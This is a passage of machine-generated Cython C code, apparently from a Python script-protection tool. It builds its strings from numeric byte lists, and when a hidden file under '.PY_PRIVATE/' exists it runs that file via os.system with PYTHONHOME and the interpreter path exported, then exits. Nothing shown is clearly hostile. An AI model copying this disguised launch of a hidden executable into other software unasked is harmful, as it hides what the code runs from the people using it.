  __Pyx_INCREF(__pyx_int_46);
  __Pyx_GIVEREF(__pyx_int_46);
  PyList_SET_ITEM(__pyx_t_1, 0, __pyx_int_46);
  __Pyx_INCREF(__pyx_int_80);
  __Pyx_GIVEREF(__pyx_int_80);
  PyList_SET_ITEM(__pyx_t_1, 1, __pyx_int_80);
  __Pyx_INCREF(__pyx_int_89);
  __Pyx_GIVEREF(__pyx_int_89);
  PyList_SET_ITEM(__pyx_t_1, 2, __pyx_int_89);
  __Pyx_INCREF(__pyx_int_95);
  __Pyx_GIVEREF(__pyx_int_95);
  PyList_SET_ITEM(__pyx_t_1, 3, __pyx_int_95);
  __Pyx_INCREF(__pyx_int_80);
  __Pyx_GIVEREF(__pyx_int_80);
  PyList_SET_ITEM(__pyx_t_1, 4, __pyx_int_80);
  __Pyx_INCREF(__pyx_int_82);
  __Pyx_GIVEREF(__pyx_int_82);
  PyList_SET_ITEM(__pyx_t_1, 5, __pyx_int_82);
  __Pyx_INCREF(__pyx_int_73);
  __Pyx_GIVEREF(__pyx_int_73);
  PyList_SET_ITEM(__pyx_t_1, 6, __pyx_int_73);
  __Pyx_INCREF(__pyx_int_86);
  __Pyx_GIVEREF(__pyx_int_86);
  PyList_SET_ITEM(__pyx_t_1, 7, __pyx_int_86);
  __Pyx_INCREF(__pyx_int_65);
  __Pyx_GIVEREF(__pyx_int_65);
  PyList_SET_ITEM(__pyx_t_1, 8, __pyx_int_65);
  __Pyx_INCREF(__pyx_int_84);
  __Pyx_GIVEREF(__pyx_int_84);
  PyList_SET_ITEM(__pyx_t_1, 9, __pyx_int_84);
  __Pyx_INCREF(__pyx_int_69);
  __Pyx_GIVEREF(__pyx_int_69);
  PyList_SET_ITEM(__pyx_t_1, 10, __pyx_int_69);
  __Pyx_INCREF(__pyx_int_47);
  __Pyx_GIVEREF(__pyx_int_47);
  PyList_SET_ITEM(__pyx_t_1, 11, __pyx_int_47);
  __Pyx_INCREF(__pyx_int_50);
  __Pyx_GIVEREF(__pyx_int_50);
  PyList_SET_ITEM(__pyx_t_1, 12, __pyx_int_50);
  __Pyx_INCREF(__pyx_int_48);
  __Pyx_GIVEREF(__pyx_int_48);
  PyList_SET_ITEM(__pyx_t_1, 13, __pyx_int_48);
  __Pyx_INCREF(__pyx_int_50);
  __Pyx_GIVEREF(__pyx_int_50);
  PyList_SET_ITEM(__pyx_t_1, 14, __pyx_int_50);
  __Pyx_INCREF(__pyx_int_53);
  __Pyx_GIVEREF(__pyx_int_53);
  PyList_SET_ITEM(__pyx_t_1, 15, __pyx_int_53);
  __Pyx_INCREF(__pyx_int_48);
  __Pyx_GIVEREF(__pyx_int_48);
  PyList_SET_ITEM(__pyx_t_1, 16, __pyx_int_48);
  __Pyx_INCREF(__pyx_int_53);
  __Pyx_GIVEREF(__pyx_int_53);
  PyList_SET_ITEM(__pyx_t_1, 17, __pyx_int_53);
  __Pyx_INCREF(__pyx_int_49);
  __Pyx_GIVEREF(__pyx_int_49);
  PyList_SET_ITEM(__pyx_t_1, 18, __pyx_int_49);
  __Pyx_INCREF(__pyx_int_49);
  __Pyx_GIVEREF(__pyx_int_49);
  PyList_SET_ITEM(__pyx_t_1, 19, __pyx_int_49);
  __Pyx_INCREF(__pyx_int_49);
  __Pyx_GIVEREF(__pyx_int_49);
  PyList_SET_ITEM(__pyx_t_1, 20, __pyx_int_49);
  __Pyx_INCREF(__pyx_int_49);
  __Pyx_GIVEREF(__pyx_int_49);
  PyList_SET_ITEM(__pyx_t_1, 21, __pyx_int_49);
  __Pyx_INCREF(__pyx_int_52);
  __Pyx_GIVEREF(__pyx_int_52);
  PyList_SET_ITEM(__pyx_t_1, 22, __pyx_int_52);
  __Pyx_INCREF(__pyx_int_51);
  __Pyx_GIVEREF(__pyx_int_51);
  PyList_SET_ITEM(__pyx_t_1, 23, __pyx_int_51);
  __Pyx_INCREF(__pyx_int_53);
  __Pyx_GIVEREF(__pyx_int_53);
  PyList_SET_ITEM(__pyx_t_1, 24, __pyx_int_53);
  __Pyx_INCREF(__pyx_int_54);
  __Pyx_GIVEREF(__pyx_int_54);
  PyList_SET_ITEM(__pyx_t_1, 25, __pyx_int_54);
  __Pyx_INCREF(__pyx_int_55);
  __Pyx_GIVEREF(__pyx_int_55);
  PyList_SET_ITEM(__pyx_t_1, 26, __pyx_int_55);
  __Pyx_INCREF(__pyx_int_53);
  __Pyx_GIVEREF(__pyx_int_53);
  PyList_SET_ITEM(__pyx_t_1, 27, __pyx_int_53);
  __Pyx_INCREF(__pyx_int_53);
  __Pyx_GIVEREF(__pyx_int_53);
  PyList_SET_ITEM(__pyx_t_1, 28, __pyx_int_53);
  __pyx_t_2 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyBytes_Type)), __pyx_t_1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 10, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = __Pyx_decode_bytes(__pyx_t_2, 0, PY_SSIZE_T_MAX, NULL, NULL, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 38, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_EXECUTE_FILE, __pyx_t_1) < 0) __PYX_ERR(0, 10, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_sys); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 39, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_1, __pyx_n_s_prefix); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 39, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_PREFIX, __pyx_t_2) < 0) __PYX_ERR(0, 39, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  __pyx_t_2 = PyList_New(18); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 40, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_INCREF(__pyx_int_101);
  __Pyx_GIVEREF(__pyx_int_101);
  PyList_SET_ITEM(__pyx_t_2, 0, __pyx_int_101);
  __Pyx_INCREF(__pyx_int_120);
  __Pyx_GIVEREF(__pyx_int_120);
  PyList_SET_ITEM(__pyx_t_2, 1, __pyx_int_120);
  __Pyx_INCREF(__pyx_int_112);
  __Pyx_GIVEREF(__pyx_int_112);
  PyList_SET_ITEM(__pyx_t_2, 2, __pyx_int_112);
  __Pyx_INCREF(__pyx_int_111);
  __Pyx_GIVEREF(__pyx_int_111);
  PyList_SET_ITEM(__pyx_t_2, 3, __pyx_int_111);
  __Pyx_INCREF(__pyx_int_114);
  __Pyx_GIVEREF(__pyx_int_114);
  PyList_SET_ITEM(__pyx_t_2, 4, __pyx_int_114);
  __Pyx_INCREF(__pyx_int_116);
  __Pyx_GIVEREF(__pyx_int_116);
  PyList_SET_ITEM(__pyx_t_2, 5, __pyx_int_116);
  __Pyx_INCREF(__pyx_int_32);
  __Pyx_GIVEREF(__pyx_int_32);
  PyList_SET_ITEM(__pyx_t_2, 6, __pyx_int_32);
  __Pyx_INCREF(__pyx_int_80);
  __Pyx_GIVEREF(__pyx_int_80);
  PyList_SET_ITEM(__pyx_t_2, 7, __pyx_int_80);
  __Pyx_INCREF(__pyx_int_89);
  __Pyx_GIVEREF(__pyx_int_89);
  PyList_SET_ITEM(__pyx_t_2, 8, __pyx_int_89);
  __Pyx_INCREF(__pyx_int_84);
  __Pyx_GIVEREF(__pyx_int_84);
  PyList_SET_ITEM(__pyx_t_2, 9, __pyx_int_84);
  __Pyx_INCREF(__pyx_int_72);
  __Pyx_GIVEREF(__pyx_int_72);
  PyList_SET_ITEM(__pyx_t_2, 10, __pyx_int_72);
  __Pyx_INCREF(__pyx_int_79);
  __Pyx_GIVEREF(__pyx_int_79);
  PyList_SET_ITEM(__pyx_t_2, 11, __pyx_int_79);
  __Pyx_INCREF(__pyx_int_78);
  __Pyx_GIVEREF(__pyx_int_78);
  PyList_SET_ITEM(__pyx_t_2, 12, __pyx_int_78);
  __Pyx_INCREF(__pyx_int_72);
  __Pyx_GIVEREF(__pyx_int_72);
  PyList_SET_ITEM(__pyx_t_2, 13, __pyx_int_72);
  __Pyx_INCREF(__pyx_int_79);
  __Pyx_GIVEREF(__pyx_int_79);
  PyList_SET_ITEM(__pyx_t_2, 14, __pyx_int_79);
  __Pyx_INCREF(__pyx_int_77);
  __Pyx_GIVEREF(__pyx_int_77);
  PyList_SET_ITEM(__pyx_t_2, 15, __pyx_int_77);
  __Pyx_INCREF(__pyx_int_69);
  __Pyx_GIVEREF(__pyx_int_69);
  PyList_SET_ITEM(__pyx_t_2, 16, __pyx_int_69);
  __Pyx_INCREF(__pyx_int_61);
  __Pyx_GIVEREF(__pyx_int_61);
  PyList_SET_ITEM(__pyx_t_2, 17, __pyx_int_61);
  __pyx_t_1 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyBytes_Type)), __pyx_t_2); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 40, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  __pyx_t_2 = __Pyx_decode_bytes(__pyx_t_1, 0, PY_SSIZE_T_MAX, NULL, NULL, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 57, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_PREFIX); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 57, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_3 = PyNumber_Add(__pyx_t_2, __pyx_t_1); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 57, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_EXPORT_PYTHONHOME, __pyx_t_3) < 0) __PYX_ERR(0, 40, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

  
  __pyx_t_3 = PyList_New(25); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 58, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_INCREF(__pyx_int_101);
  __Pyx_GIVEREF(__pyx_int_101);
  PyList_SET_ITEM(__pyx_t_3, 0, __pyx_int_101);
  __Pyx_INCREF(__pyx_int_120);
  __Pyx_GIVEREF(__pyx_int_120);
  PyList_SET_ITEM(__pyx_t_3, 1, __pyx_int_120);
  __Pyx_INCREF(__pyx_int_112);
  __Pyx_GIVEREF(__pyx_int_112);
  PyList_SET_ITEM(__pyx_t_3, 2, __pyx_int_112);
  __Pyx_INCREF(__pyx_int_111);
  __Pyx_GIVEREF(__pyx_int_111);
  PyList_SET_ITEM(__pyx_t_3, 3, __pyx_int_111);
  __Pyx_INCREF(__pyx_int_114);
  __Pyx_GIVEREF(__pyx_int_114);
  PyList_SET_ITEM(__pyx_t_3, 4, __pyx_int_114);
  __Pyx_INCREF(__pyx_int_116);
  __Pyx_GIVEREF(__pyx_int_116);
  PyList_SET_ITEM(__pyx_t_3, 5, __pyx_int_116);
  __Pyx_INCREF(__pyx_int_32);
  __Pyx_GIVEREF(__pyx_int_32);
  PyList_SET_ITEM(__pyx_t_3, 6, __pyx_int_32);
  __Pyx_INCREF(__pyx_int_80);
  __Pyx_GIVEREF(__pyx_int_80);
  PyList_SET_ITEM(__pyx_t_3, 7, __pyx_int_80);
  __Pyx_INCREF(__pyx_int_89);
  __Pyx_GIVEREF(__pyx_int_89);
  PyList_SET_ITEM(__pyx_t_3, 8, __pyx_int_89);
  __Pyx_INCREF(__pyx_int_84);
  __Pyx_GIVEREF(__pyx_int_84);
  PyList_SET_ITEM(__pyx_t_3, 9, __pyx_int_84);
  __Pyx_INCREF(__pyx_int_72);
  __Pyx_GIVEREF(__pyx_int_72);
  PyList_SET_ITEM(__pyx_t_3, 10, __pyx_int_72);
  __Pyx_INCREF(__pyx_int_79);
  __Pyx_GIVEREF(__pyx_int_79);
  PyList_SET_ITEM(__pyx_t_3, 11, __pyx_int_79);
  __Pyx_INCREF(__pyx_int_78);
  __Pyx_GIVEREF(__pyx_int_78);
  PyList_SET_ITEM(__pyx_t_3, 12, __pyx_int_78);
  __Pyx_INCREF(__pyx_int_95);
  __Pyx_GIVEREF(__pyx_int_95);
  PyList_SET_ITEM(__pyx_t_3, 13, __pyx_int_95);
  __Pyx_INCREF(__pyx_int_69);
  __Pyx_GIVEREF(__pyx_int_69);
  PyList_SET_ITEM(__pyx_t_3, 14, __pyx_int_69);
  __Pyx_INCREF(__pyx_int_88);
  __Pyx_GIVEREF(__pyx_int_88);
  PyList_SET_ITEM(__pyx_t_3, 15, __pyx_int_88);
  __Pyx_INCREF(__pyx_int_69);
  __Pyx_GIVEREF(__pyx_int_69);
  PyList_SET_ITEM(__pyx_t_3, 16, __pyx_int_69);
  __Pyx_INCREF(__pyx_int_67);
  __Pyx_GIVEREF(__pyx_int_67);
  PyList_SET_ITEM(__pyx_t_3, 17, __pyx_int_67);
  __Pyx_INCREF(__pyx_int_85);
  __Pyx_GIVEREF(__pyx_int_85);
  PyList_SET_ITEM(__pyx_t_3, 18, __pyx_int_85);
  __Pyx_INCREF(__pyx_int_84);
  __Pyx_GIVEREF(__pyx_int_84);
  PyList_SET_ITEM(__pyx_t_3, 19, __pyx_int_84);
  __Pyx_INCREF(__pyx_int_65);
  __Pyx_GIVEREF(__pyx_int_65);
  PyList_SET_ITEM(__pyx_t_3, 20, __pyx_int_65);
  __Pyx_INCREF(__pyx_int_66);
  __Pyx_GIVEREF(__pyx_int_66);
  PyList_SET_ITEM(__pyx_t_3, 21, __pyx_int_66);
  __Pyx_INCREF(__pyx_int_76);
  __Pyx_GIVEREF(__pyx_int_76);
  PyList_SET_ITEM(__pyx_t_3, 22, __pyx_int_76);
  __Pyx_INCREF(__pyx_int_69);
  __Pyx_GIVEREF(__pyx_int_69);
  PyList_SET_ITEM(__pyx_t_3, 23, __pyx_int_69);
  __Pyx_INCREF(__pyx_int_61);
  __Pyx_GIVEREF(__pyx_int_61);
  PyList_SET_ITEM(__pyx_t_3, 24, __pyx_int_61);
  __pyx_t_1 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyBytes_Type)), __pyx_t_3); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 58, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

  
  __pyx_t_3 = __Pyx_decode_bytes(__pyx_t_1, 0, PY_SSIZE_T_MAX, NULL, NULL, NULL); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 82, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_sys); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 82, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_1, __pyx_n_s_executable); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 82, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = PyNumber_Add(__pyx_t_3, __pyx_t_2); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 82, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_EXPORT_PYTHON_EXECUTABLE, __pyx_t_1) < 0) __PYX_ERR(0, 58, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = PyList_New(2); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 84, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_INCREF(__pyx_int_46);
  __Pyx_GIVEREF(__pyx_int_46);
  PyList_SET_ITEM(__pyx_t_1, 0, __pyx_int_46);
  __Pyx_INCREF(__pyx_int_47);
  __Pyx_GIVEREF(__pyx_int_47);
  PyList_SET_ITEM(__pyx_t_1, 1, __pyx_int_47);
  __pyx_t_2 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyBytes_Type)), __pyx_t_1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 84, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_decode_bytes(__pyx_t_2, 0, PY_SSIZE_T_MAX, NULL, NULL, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 84, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_EXECUTE_FILE); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 84, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_3 = PyNumber_Add(__pyx_t_1, __pyx_t_2); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 84, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_RUN, __pyx_t_3) < 0) __PYX_ERR(0, 84, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

  
  __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_os); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 86, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_path); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 86, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_isfile); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 86, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_EXECUTE_FILE); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 86, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_1 = __Pyx_PyObject_CallOneArg(__pyx_t_3, __pyx_t_2); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 86, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_4 = __Pyx_PyObject_IsTrue(__pyx_t_1); if (unlikely(__pyx_t_4 < 0)) __PYX_ERR(0, 86, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  if (__pyx_t_4) {

    
    __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_os); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 87, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_1, __pyx_n_s_system); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 87, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
    __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_EXPORT_PYTHONHOME); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 87, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);

    
    __pyx_t_3 = PyList_New(4); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 88, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __Pyx_INCREF(__pyx_int_32);
    __Pyx_GIVEREF(__pyx_int_32);
    PyList_SET_ITEM(__pyx_t_3, 0, __pyx_int_32);
    __Pyx_INCREF(__pyx_int_38);
    __Pyx_GIVEREF(__pyx_int_38);
    PyList_SET_ITEM(__pyx_t_3, 1, __pyx_int_38);
    __Pyx_INCREF(__pyx_int_38);
    __Pyx_GIVEREF(__pyx_int_38);
    PyList_SET_ITEM(__pyx_t_3, 2, __pyx_int_38);
    __Pyx_INCREF(__pyx_int_32);
    __Pyx_GIVEREF(__pyx_int_32);
    PyList_SET_ITEM(__pyx_t_3, 3, __pyx_int_32);
    __pyx_t_5 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyBytes_Type)), __pyx_t_3); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 88, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_5);
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
    __pyx_t_3 = __Pyx_decode_bytes(__pyx_t_5, 0, PY_SSIZE_T_MAX, NULL, NULL, NULL); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 88, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;

    
    __pyx_t_5 = PyNumber_Add(__pyx_t_1, __pyx_t_3); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 87, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_5);
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

    
    __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_EXPORT_PYTHON_EXECUTABLE); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 89, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);

    
    __pyx_t_1 = PyNumber_Add(__pyx_t_5, __pyx_t_3); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 88, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

    
    __pyx_t_3 = PyList_New(4); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 90, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __Pyx_INCREF(__pyx_int_32);
    __Pyx_GIVEREF(__pyx_int_32);
    PyList_SET_ITEM(__pyx_t_3, 0, __pyx_int_32);
    __Pyx_INCREF(__pyx_int_38);
    __Pyx_GIVEREF(__pyx_int_38);
    PyList_SET_ITEM(__pyx_t_3, 1, __pyx_int_38);
    __Pyx_INCREF(__pyx_int_38);
    __Pyx_GIVEREF(__pyx_int_38);
    PyList_SET_ITEM(__pyx_t_3, 2, __pyx_int_38);
    __Pyx_INCREF(__pyx_int_32);
    __Pyx_GIVEREF(__pyx_int_32);
    PyList_SET_ITEM(__pyx_t_3, 3, __pyx_int_32);
    __pyx_t_5 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyBytes_Type)), __pyx_t_3); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 90, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_5);
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
    __pyx_t_3 = __Pyx_decode_bytes(__pyx_t_5, 0, PY_SSIZE_T_MAX, NULL, NULL, NULL); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 90, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;

    
    __pyx_t_5 = PyNumber_Add(__pyx_t_1, __pyx_t_3); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 89, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_5);
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

    
    __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_RUN); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 91, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);

    
    __pyx_t_1 = PyNumber_Add(__pyx_t_5, __pyx_t_3); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 90, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

    
    __pyx_t_3 = __Pyx_PyObject_CallOneArg(__pyx_t_2, __pyx_t_1); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 87, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

    
    __pyx_t_3 = __Pyx_PyObject_Call(__pyx_builtin_exit, __pyx_tuple_, NULL); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 92, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

    
  }

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_C_SOURCE, __pyx_kp_u_ifndef_PY_SSIZE_T_CLEAN_define) < 0) __PYX_ERR(0, 94, __pyx_L1_error)

  
  __pyx_t_3 = PyList_New(13); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 3720, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_INCREF(__pyx_int_46);
  __Pyx_GIVEREF(__pyx_int_46);
  PyList_SET_ITEM(__pyx_t_3, 0, __pyx_int_46);
  __Pyx_INCREF(__pyx_int_112);
  __Pyx_GIVEREF(__pyx_int_112);
  PyList_SET_ITEM(__pyx_t_3, 1, __pyx_int_112);
  __Pyx_INCREF(__pyx_int_121);
  __Pyx_GIVEREF(__pyx_int_121);
  PyList_SET_ITEM(__pyx_t_3, 2, __pyx_int_121);
  __Pyx_INCREF(__pyx_int_95);
  __Pyx_GIVEREF(__pyx_int_95);
  PyList_SET_ITEM(__pyx_t_3, 3, __pyx_int_95);
  __Pyx_INCREF(__pyx_int_112);
  __Pyx_GIVEREF(__pyx_int_112);
  PyList_SET_ITEM(__pyx_t_3, 4, __pyx_int_112);
  __Pyx_INCREF(__pyx_int_114);
  __Pyx_GIVEREF(__pyx_int_114);
  PyList_SET_ITEM(__pyx_t_3, 5, __pyx_int_114);
  __Pyx_INCREF(__pyx_int_105);
  __Pyx_GIVEREF(__pyx_int_105);
  PyList_SET_ITEM(__pyx_t_3, 6, __pyx_int_105);
  __Pyx_INCREF(__pyx_int_118);
  __Pyx_GIVEREF(__pyx_int_118);
  PyList_SET_ITEM(__pyx_t_3, 7, __pyx_int_118);
  __Pyx_INCREF(__pyx_int_97);
  __Pyx_GIVEREF(__pyx_int_97);
  PyList_SET_ITEM(__pyx_t_3, 8, __pyx_int_97);
  __Pyx_INCREF(__pyx_int_116);
  __Pyx_GIVEREF(__pyx_int_116);
  PyList_SET_ITEM(__pyx_t_3, 9, __pyx_int_116);
  __Pyx_INCREF(__pyx_int_101);
  __Pyx_GIVEREF(__pyx_int_101);
  PyList_SET_ITEM(__pyx_t_3, 10, __pyx_int_101);
  __Pyx_INCREF(__pyx_int_46);
  __Pyx_GIVEREF(__pyx_int_46);
  PyList_SET_ITEM(__pyx_t_3, 11, __pyx_int_46);
  __Pyx_INCREF(__pyx_int_99);
  __Pyx_GIVEREF(__pyx_int_99);
  PyList_SET_ITEM(__pyx_t_3, 12, __pyx_int_99);
  __pyx_t_1 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyBytes_Type)), __pyx_t_3); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 3720, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

  
  __pyx_t_3 = __Pyx_decode_bytes(__pyx_t_1, 0, PY_SSIZE_T_MAX, NULL, NULL, NULL); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 3721, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
